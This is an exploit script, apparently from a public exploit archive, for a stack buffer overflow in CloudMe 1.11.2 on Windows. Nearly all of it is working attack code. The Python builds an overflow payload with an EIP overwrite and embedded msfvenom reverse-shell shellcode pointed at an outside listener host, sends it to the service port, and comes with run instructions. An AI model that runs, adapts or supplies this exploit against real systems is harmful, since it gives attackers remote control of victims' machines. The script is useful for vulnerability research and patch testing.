# Exploit Title: CloudMe 1.11.2 - Buffer Overflow
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.41 LPORT=9005 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
buf =  b""
buf += b"\xbb\xc1\x90\x0e\x4f\xdb\xc2\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x5a\x12\x83\xc2\x04\x03\x9b\x9e\xec"
buf += b"\xba\xe7\x77\x72\x44\x17\x88\x13\xcc\xf2\xb9\x13\xaa"
buf += b"\x77\xe9\xa3\xb8\xd5\x06\x4f\xec\xcd\x9d\x3d\x39\xe2"
buf += b"\x16\x8b\x1f\xcd\xa7\xa0\x5c\x4c\x24\xbb\xb0\xae\x15"
buf += b"\x74\xc5\xaf\x52\x69\x24\xfd\x0b\xe5\x9b\x11\x3f\xb3"
buf += b"\x27\x9a\x73\x55\x20\x7f\xc3\x54\x01\x2e\x5f\x0f\x81"
buf += b"\xd1\x8c\x3b\x88\xc9\xd1\x06\x42\x62\x21\xfc\x55\xa2"
buf += b"\x7b\xfd\xfa\x8b\xb3\x0c\x02\xcc\x74\xef\x71\x24\x87"
buf += b"\x92\x81\xf3\xf5\x48\x07\xe7\x5e\x1a\xbf\xc3\x5f\xcf"
buf += b"\x26\x80\x6c\xa4\x2d\xce\x70\x3b\xe1\x65\x8c\xb0\x04"
buf += b"\xa9\x04\x82\x22\x6d\x4c\x50\x4a\x34\x28\x37\x73\x26"
buf += b"\x93\xe8\xd1\x2d\x3e\xfc\x6b\x6c\x57\x31\x46\x8e\xa7"
buf += b"\x5d\xd1\xfd\x95\xc2\x49\x69\x96\x8b\x57\x6e\xd9\xa1"
buf += b"\x20\xe0\x24\x4a\x51\x29\xe3\x1e\x01\x41\xc2\x1e\xca"
buf += b"\x91\xeb\xca\x5d\xc1\x43\xa5\x1d\xb1\x23\x15\xf6\xdb"
buf += b"\xab\x4a\xe6\xe4\x61\xe3\x8d\x1f\xe2\x06\x58\x11\xdb"
buf += b"\x7e\x5e\x2d\x38\x52\xd7\xcb\x54\xbc\xb1\x44\xc1\x25"
buf += b"\x98\x1e\x70\xa9\x36\x5b\xb2\x21\xb5\x9c\x7d\xc2\xb0"
buf += b"\x8e\xea\x22\x8f\xec\xbd\x3d\x25\x98\x22\xaf\xa2\x58"
buf += b"\x2c\xcc\x7c\x0f\x79\x22\x75\xc5\x97\x1d\x2f\xfb\x65"
buf += b"\xfb\x08\xbf\xb1\x38\x96\x3e\x37\x04\xbc\x50\x81\x85"
buf += b"\xf8\x04\x5d\xd0\x56\xf2\x1b\x8a\x18\xac\xf5\x61\xf3"
buf += b"\x38\x83\x49\xc4\x3e\x8c\x87\xb2\xde\x3d\x7e\x83\xe1"
buf += b"\xf2\x16\x03\x9a\xee\x86\xec\x71\xab\xa7\x0e\x53\xc6"
buf += b"\x4f\x97\x36\x6b\x12\x28\xed\xa8\x2b\xab\x07\x51\xc8"
buf += b"\xb3\x62\x54\x94\x73\x9f\x24\x85\x11\x9f\x9b\xa6\x33"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + buf))	

payload = padding1 + EIP + NOPS + buf + overrun 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,9000))
	s.send(payload)
except Exception as e:
	print(sys.exc_value)